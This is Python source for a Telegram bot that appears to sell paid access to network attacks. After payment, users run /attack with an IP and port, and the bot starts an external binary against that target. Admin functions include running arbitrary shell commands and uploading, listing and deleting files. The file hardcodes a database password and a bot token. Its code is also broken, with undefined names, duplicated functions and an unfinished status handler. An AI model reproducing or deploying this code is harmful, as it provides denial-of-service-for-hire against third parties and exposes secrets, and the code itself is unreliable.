import time
import asyncio
import random
import string
import logging
import pytesseract
from PIL import Image
import requests
import io
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,  # Ensure this is imported
    CallbackContext,
)
from datetime import datetime, timedelta, timezone
from datetime import datetime, timezone
import logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

MONGO_URI = 'mongodb+srv://satyamgaming517:5dIDBU7Oih4BlakI@lund.7obqk.mongodb.net'
client = MongoClient(MONGO_URI)
db = client['Tfkgff']
users_collection = db['VAMPIREXCHEATS']
redeem_codes_collection = db['redeem_codes0']



TELEGRAM_BOT_TOKEN = '7707928811:AAGmRkkaAh_QTfHhqyEu_a_5qbSGhZctrEs'
ADMIN_CHAT_ID = 5846326674  # Replace with the actual admin chat ID

cooldown_dict = {}
user_attack_history = {}
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

async def is_user_allowed(user_id):
    """Check if user has access based on expiry date."""
    user_data = users_collection.get(user_id)
    if user_data and user_data["expiry_date"] > datetime.now(timezone.utc):
        return True
    return False
async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*😈😈💦 /start* - Start interacting with the bot.\n"
            "*😈😈💦 /attack* - Trigger an attack operation.\n"
            "*😈😈💦 /redeem* - Redeem a code.\n"
            "*😈😈💦 /price* - aukat madharcod 🥵?.\n"
            "*😈😈💦 /check* - check zindgi ke baki din.\n"
        )
    else:
        help_text = (
            "*☄️ Available Commands for Admins:*\n\n"
            "*😈😈💦 /start* - Start the bot.\n"
            "*😈😈💦 /attack* - Start the attack.\n"
            "*😈😈💦 /get_id* - Get user id.\n"
            "*😈😈💦 /remove [user_id]* - Remove a user.\n"
            "*😈😈💦 /users* - List all allowed users.\n"
            "*😈😈💦 /redeem* - Redeem a code.\n"
            "*😈😈💦 /check* - check zindgi ke baki din.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
    
    
async def is_user_allowed(user_id):
    """Check if user has access based on expiry date."""
    user_data = users_collection.get(user_id)
    if user_data and user_data["expiry_date"] > datetime.now(timezone.utc):
        return True
    return False
    
async def start(update: Update, context: CallbackContext):
    """Handle /start command - show plan selection."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if user already has access
    if await is_user_allowed(user_id):
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*🚀 Welcome Back!* Tohar paas already access ba.\n\n"
                "Use /help sab commands dekhne ke liye."
            ),
            parse_mode='Markdown'
        )
        return

    # Plan selection buttons
    keyboard = [
        [InlineKeyboardButton("Plan 1 - ₹100", callback_data="plan_1")],
        [InlineKeyboardButton("Plan 2 - ₹200", callback_data="plan_2")],
        [InlineKeyboardButton("Plan 3 - ₹500", callback_data="plan_3")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            " 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐁𝐎𝐓:\n"
            "BADMODH BHAI ke world me swagat ba!  /price dekhane ke liye dabao Plan select karke payment bhejo.\n\n"
            "Yeh raha plan selection ka option agar price dekhna h to /price dabao. Apna plan select karo:"
        ),
        reply_markup=reply_markup
    )

# Callback handler for plan selection
async def handle_plan_selection(update: Update, context: CallbackContext):
    """Handle the selected plan and send the corresponding QR code."""
    query = update.callback_query
    chat_id = query.message.chat.id
    plan_selected = query.data

    # Determine QR code based on plan selected
    if plan_selected == "plan_1":
        qr_code_link = "https://i.postimg.cc/Y2THkctN/Screenshot-20250214-152440-Fam-App.jpg"
        plan_name = "Plan 1 - ₹100"
    elif plan_selected == "plan_2":
        qr_code_link = "https://i.postimg.cc/Y2THkctN/Screenshot-20250214-152440-Fam-App.jpg"
        plan_name = "Plan 2 - ₹200"
    elif plan_selected == "plan_3":
        qr_code_link = "https://i.postimg.cc/Y2THkctN/Screenshot-20250214-152440-Fam-App.jpg"
        plan_name = "Plan 3 - ₹500"
    else:
        await query.answer("Invalid selection!", show_alert=True)
        return

    await query.answer()  # Acknowledge button press
    await query.edit_message_text(
        text=f"✅ You selected: *{plan_name}*\n\nPlease complete the payment using the QR code below /price.",
        parse_mode="Markdown"
    )
    await context.bot.send_photo(
        chat_id=chat_id,
        photo=qr_code_link,
        caption=(
            " agar price pta nhi h to /price Yeh raha payment ke QR code. Payment krne ke baad bot ko reply me screens hot bhej diyo.\n"
            "Verify hone ke baad aapko access de diya jayega. Dhanyawaad!"
        )
    )    
    
async def price(update: Update, context: CallbackContext):
    """Handle /price command - sends the price list photo."""
    chat_id = update.effective_chat.id

    # Replace this with your actual price list image URL
    price_list_image_url = "https://i.postimg.cc/ht6BXC8B/IMG-20250128-181501.jpg"

    await context.bot.send_photo(
        chat_id=chat_id,
        photo=price_list_image_url,
        caption="Yeh raha humara price list. Aap jo plan chahte hain, wo select karein aur payment karein aur phir bot ko ss dede ."
    )
    

async def pay(update: Update, context: CallbackContext):
    """Handle /pay command - sends the payment QR code."""
    chat_id = update.effective_chat.id

    # Replace this with your actual QR code image URL
    qr_code_link = "https://i.postimg.cc/Y2THkctN/Screenshot-20250214-152440-Fam-App.jpg"

    await context.bot.send_photo(
        chat_id=chat_id,
        photo=qr_code_link,
        caption=(
            "Yeh raha payment ke QR code. Payment krne ke baad bot ko reply me ss bhej di "
            "Verify hone me 2 min ke baad tohke access mil jayi. Dhanyawaad! @BADMOSH_X_GYRANGE"
        )
    )
    
    
# Check if the user is the admin
def is_admin(user_id):
    return user_id == ADMIN_USER_ID


# Track the last screenshot received time for each user
last_screenshot_time = {}


pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

payment_keywords = ['₹', 'Rs.', 'Pay', 'Amount', 'Txn', 'UPI', 'Paid', 'Balance', 'Total', 'INR']
user_screenshot_times = {}  # Store user screenshot timestamps
user_wait_times = {}  # Store increasing wait times

async def is_payment_related(image_url):
    """Check if the screenshot contains payment-related text."""
    try:
        response = requests.get(image_url)
        img = Image.open(io.BytesIO(response.content))
        extracted_text = pytesseract.image_to_string(img)
        return any(keyword in extracted_text for keyword in payment_keywords)
    except Exception as e:
        print(f"❌ Error processing image: {e}")
        return False

async def handle_payment_screenshot(update: Update, context: CallbackContext):
    """Handle payment screenshot with cooldown system."""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    current_time = time.time()

    # Default starting cooldown: 2 minutes (120 sec)
    if user_id not in user_wait_times:
        user_wait_times[user_id] = 120  # Start with 2 minutes

    # Check last screenshot time
    if user_id in user_screenshot_times:
        elapsed_time = current_time - user_screenshot_times[user_id]
        if elapsed_time < user_wait_times[user_id]:
            remaining_time = int(user_wait_times[user_id] - elapsed_time)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏳ *Bhai ruk ja! Wait {remaining_time} sec before sending another screenshot!*",
                parse_mode='Markdown'
            )
            return

    # If screenshot is valid, update time and increase cooldown
    if update.message.photo:
        photo_file = await update.message.photo[-1].get_file()
        file_path = photo_file.file_path  # Image URL

        if await is_payment_related(file_path):
            user_screenshot_times[user_id] = current_time  # Update last sent time
            user_wait_times[user_id] = min(user_wait_times[user_id] * 2, 2000 * 60)  # Double time but max 2000 min

            await context.bot.send_message(
                chat_id=chat_id,
                text="✅ *Payment screenshot verified!* Admin review के बाद confirmation मिली।",
                parse_mode='Markdown'
            )

            # Notify admin
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=(
                    f"🔔 *New Payment Screenshot Verified!*\n\n"
                    f"User ID: `{user_id}`\n\n"
                    f"[View Screenshot]({file_path})\n\n"
                    f"Confirm करने के लिए: `/confirm {user_id}`"
                ),
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=chat_id,
                text="❌ *भाई, payment screenshot भेजा, random photo मत भेज!*",
                parse_mode='Markdown'
            )
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ *बेटा, screenshot भेजना सीख ले पहले!*",
            parse_mode='Markdown'
        )

async def confirm_payment(update: Update, context: CallbackContext):
    """Admin command to confirm a user's payment."""
    user_id = update.effective_user.id

    # Check if the person is admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to confirm payments!*",
            parse_mode='Markdown'
        )
        return

    # Check if user ID and duration are provided
    if len(context.args) < 2:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /confirm <user_id> <duration (e.g., 30d)>*",
            parse_mode='Markdown'
        )
        return

    target_user_id = int(context.args[0])
    duration = context.args[1]

    # Parse duration (e.g., "30d" or "1m")
    days = 0
    minutes = 0
    if "d" in duration:
        days = int(duration.replace("d", ""))
    if "m" in duration:
        minutes = int(duration.replace("m", ""))

    expiry_date = datetime.now(timezone.utc) + timedelta(days=days, minutes=minutes)

    # Add user to the database
    try:
        users_collection.update_one(
            {"user_id": target_user_id},  # Find user by ID
            {"$set": {"expiry_date": expiry_date}},  # Update expiry date
            upsert=True  # Insert if user doesn't exist
        )

        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*✅ Payment confirmed for User ID {target_user_id}.*\nThey now have access to the bot.",
            parse_mode='Markdown'
        )

        # Notify the user
        await context.bot.send_message(
            chat_id=target_user_id,
            text=(
                "*🎉 Payment Confirmed!*\n\n"
                f"You now have access to all commands until *{expiry_date.strftime('%Y-%m-%d %H:%M:%S')} UTC*.\n"
                "Use `/help` to see the full list of available commands."
            ),
            parse_mode='Markdown'
        )

    except Exception as e:
        logger.error(f"Error updating user in database: {e}")
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ Failed to confirm payment. Please try again.*",
            parse_mode='Markdown'
        )


async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

# Example of multi-threading in action (run the attack in background)
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ *Bhai, tohke access nahi hai!* 🚫", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Usage: /attack <IP> <Port>*", parse_mode='Markdown')
        return

    ip, port = args
    duration = "123"

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"💥 *Chudai Started on {ip}:{port}!* 🔥\n⏳ Duration: {duration} sec\n\n🚀 *Get Ready for Bawal!*",
        parse_mode='Markdown'
    )
    
    cooldown_period = 0
    current_time = datetime.now()
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ Wait for attack finish {remaining_time}*",
                parse_mode='Markdown'
            )
            return
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*💀 ⚠️𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙉𝙄𝙏𝙸𝘼𝙏𝙀𝘿!❗ 💀*\n"
            f"💢 *ꜱɪɢᴍᴀ ꜱᴛʀɪᴋᴇ ɪɴ ᴇ꜇ᴇᴄᴛ!* 💢\n\n"
            f"*🎯 ᴛᴀʀɢᴇᴛ ꜱᴇᴛ: {ip}:{port}*\n"
            f"*⏳ᴅᴜʀᴀᴛɪᴏɴ ʟᴏᴄᴋᴇᴅ: {duration} seconds*\n"
            f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @BADMOSH_X_GYRANGE💥*"
        ), parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))



# Modify the run_attack function to use async subprocess
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./IZUNA {ip} {port} {duration} 1 100",   # Modify the command as required
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
        
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    
    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def generate_redeem_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to generate redeem codes!*",
            parse_mode='Markdown'
        )
        return

    # Check arguments for customization
    if len(context.args) < 3:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=(
                "*⚠️ Usage: /gen <prefix> <number_of_codes> <expiry_time><d/m> [max_uses]*\n\n"
                "Example: `/gen BADMOSH 10 2m 1`\n"
                "- `BADMOSH`: Prefix\n"
                "- `10`: Number of codes\n"
                "- `2m`: Expiry time (2 minutes)\n"
                "- `1`: Maximum uses per code (optional, default is 1)"
            ),
            parse_mode='Markdown'
        )
        return

    # Parse user input
    prefix = context.args[0]
    try:
        num_codes = int(context.args[1])
        expiry_time = context.args[2]
        max_uses = int(context.args[3]) if len(context.args) > 3 else 1
    except ValueError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please provide valid inputs for number of codes, expiry time, and max uses.*",
            parse_mode='Markdown'
        )
        return

    # Calculate expiry date
    if expiry_time[-1].lower() == 'd':  # Days
        expiry_date = datetime.now(timezone.utc) + timedelta(days=int(expiry_time[:-1]))
        expiry_label = f"{expiry_time[:-1]} day(s)"
    elif expiry_time[-1].lower() == 'm':  # Minutes
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=int(expiry_time[:-1]))
        expiry_label = f"{expiry_time[:-1]} minute(s)"
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Expiry time must end with 'd' (days) or 'm' (minutes).*",
            parse_mode='Markdown'
        )
        return

    # Generate redeem codes
    redeem_codes = []
    for _ in range(num_codes):
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        redeem_code = f"{prefix}-{random_suffix}"
        redeem_codes.append(redeem_code)

        # Save each code in MongoDB
        redeem_codes_collection.insert_one({
            "code": redeem_code,
            "expiry_date": expiry_date,
            "used_by": [],
            "max_uses": max_uses,
            "redeem_count": 0
        })

    # Prepare message to send
    codes_message = "\n".join(redeem_codes)
    response_message = (
        f"✅ *{num_codes} redeem codes generated with prefix {prefix}:*\n\n"
        f"{codes_message}\n\n"
        f"*Expires in {expiry_label}*\n"
        f"*Max uses per code: {max_uses}*"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=response_message,
        parse_mode='Markdown'
    )
  
    
async def check_status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if user is allowed
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Bhai, tohra pass is bot ke entry ka permission nai hai!*", parse_mode='Markdown')
        return

    # Calculate remaining time
    expiry_date = user.get('expiry_date')
    if expiry_date:
        current_time = datetime.now(timezone.utc)
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        remaining_time = expiry_date - current_time

        if remaining_time.total_seconds() <= 0:
            remaining_time_text = "*Tora time khatam ho gayil hai, re bhai!*"
        else:
            days = remaining_time.days
            hours, remainder = divmod(remaining_time.seconds, 3600)
            minutes = remainder // 60
            remaining_time_text = f"{days} din, {hours} ghanta, {minutes} minute bacha ba."
    else:
        remaining_time_text = "*Expiry ka data nai milal!*"

    # Check last attack time
    last_attack_time = cooldown_dict.get(user_id, None)
    last_attack_duration = None  # Default value if no attack is found
    if last_attack_time:
        # Calculate time since the last attack
        last_attack_elapsed = datetime.now() - last_attack_time
        last_attack_text = f"{last_attack_elapsed.seconds // 60} minute pehle kehlat rahal."
        
        # Fetch duration of last attack
        last_attack_details = user_attack_history.get(user_id, None)
        if last_attack_details:
            _, _, duration = list(last_attack_details)[-1]  # Fetch the most recent attack duration
            last_attack_duration = f"{duration} second lagal rahal."
        else:
            last_attack_duration = "Milal nai."
    else:
        last_attack_text = "Abhi tak koi attack nai kehlal ba."
        last_attack_duration = "N/A"
# Function to handle terminal commands
async def execute_terminal(update: Update, context: CallbackContext):
    global current_directory
    user_id = update.effective_user.id

    # Restrict access to admin only
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="a *You are not authorized to execute terminal commands!*",
            parse_mode='Markdown'
        )
        return

    # Ensure a command is provided
    if not context.args:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="⚠️ *Usage: /terminal <command>*",
            parse_mode='Markdown'
        )
        return

    # Join arguments to form the command
    command = ' '.join(context.args)

    # Check if the command starts with a blocked command
    if any(command.startswith(blocked_cmd) for blocked_cmd in BLOCKED_COMMANDS):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Command '{command}' is not allowed!*",
            parse_mode='Markdown'
        )
        return

    # Handle `cd` command separately to change the current directory
    if command.startswith('cd '):
        # Get the directory to change to
        new_directory = command[3:].strip()

        # Resolve the absolute path of the directory
        absolute_path = os.path.abspath(os.path.join(current_directory, new_directory))

        # Ensure the directory exists before changing
        if os.path.isdir(absolute_path):
            current_directory = absolute_path
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *Changed directory to:* `{current_directory}`",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ *Directory not found:* `{new_directory}`",
                parse_mode='Markdown'
            )
        return

    try:
        # Get dynamic user and host information
        user, host = get_user_and_host()

        # Create the prompt dynamically like 'username@hostname:/current/path$'
        current_dir = os.path.basename(current_directory) if current_directory != '/' else ''
        prompt = f"{user}@{host}:{current_dir}$ "

        # Run the command asynchronously
        result = await asyncio.create_subprocess_shell(
            command,
            cwd=current_directory,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Capture the output and error (if any)
        stdout, stderr = await result.communicate()

        # Decode the byte output
        output = stdout.decode().strip() or stderr.decode().strip()

        # If there is no output, inform the user
        if not output:
            output = "No output or error from the command."

        # Limit the output to 4000 characters to avoid Telegram message size limits
        if len(output) > 4000:
            output = output[:4000] + "\n⚠️ Output truncated due to length."

        # Send the output back to the user, including the prompt
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"💻 *Command Output:*\n{prompt}\n```{output}```",
            parse_mode='Markdown'
        )

    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Error executing command:*\n```{str(e)}```",
            parse_mode='Markdown'
        )

# Add to handle uploads when replying to a file
async def upload(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    # Only allow admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to upload files!*",
            parse_mode='Markdown'
        )
        return

    # Ensure the message is a reply to a file
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Please reply to a file message with /upload to process it.*",
            parse_mode='Markdown'
        )
        return

    # Process the replied-to file
    document = update.message.reply_to_message.document
    file_name = document.file_name
    file_path = os.path.join(os.getcwd(), file_name)

    # Download the file
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"✅ *File '{file_name}' has been uploaded successfully!*",
        parse_mode='Markdown'
    )


# Function to list files in a directory
async def list_files(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to list files!*",
            parse_mode='Markdown'
        )
        return

    directory = context.args[0] if context.args else os.getcwd()

    if not os.path.isdir(directory):
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Directory not found:* `{directory}`",
            parse_mode='Markdown'
        )
        return

    try:
        files = os.listdir(directory)
        if files:
            files_list = "\n".join(files)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *Files in Directory:* `{directory}`\n{files_list}",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"📂 *No files in the directory:* `{directory}`",
                parse_mode='Markdown'
            )
    except Exception as e:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"❌ *Error accessing the directory:* `{str(e)}`",
            parse_mode='Markdown'
        )


async def delete_file(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to delete files!*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ Usage: /delete <file_name>*",
            parse_mode='Markdown'
        )
        return

    file_name = context.args[0]
    file_path = os.path.join(os.getcwd(), file_name)

    if file_name in PROTECTED_FILES:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ *File '{file_name}' is protected and cannot be deleted.*",
            parse_mode='Markdown'
        )
        return

    if os.path.exists(file_path):
        os.remove(file_path)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"✅ *File '{file_name}' has been deleted.*",
            parse_mode='Markdown'
        )
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"⚠️ *File '{file_name}' not found.*",
            parse_mode='Markdown'
        )
        
async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    # Response message
    response_message = (
        f"*📊 Status Check:*\n\n"
        f"👤 *Tora ID:* `{user_id}`\n"
        f"⏳ *Kitna Din Bacha Ba:* {remaining_time_text}\n"
        f"💥 *Aakhri attack Kab Kehlal:* {last_attack_text}\n"
        f"⏱️ *attack Me Kitna Time Lagal:* {last_attack_duration}\n"
        f"\n*Bot ke upyog ke liye dhanyavaad, Bhaiya!*"
    )

    await context.bot.send_message(chat_id=chat_id, text=response_message, parse_mode='Markdown')

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

async def unknown(update: Update, context: CallbackContext):
    await update.message.reply_text("माफ करीं, ई command supported नाहीं बा।")

async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()    
    user_list_message = "👥 User List:\n" 
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = -0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False      
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        if expired:
            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
        else:
            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Existing handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("pay", pay))
    application.add_handler(CommandHandler("confirm", confirm_payment))  # Admin confirms payment
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_codes))
    application.add_handler(CommandHandler("redeem", redeem_code))
  
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("check", check_status))
    application.add_handler(CommandHandler("pay", pay))
    application.add_handler(CommandHandler("price", price))
    
   
    application.add_handler(MessageHandler(filters.PHOTO, handle_payment_screenshot))  # Screenshot 
    application.add_handler(CallbackQueryHandler(handle_plan_selection))  # CallbackQueryHandler added here

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
    
    
    
   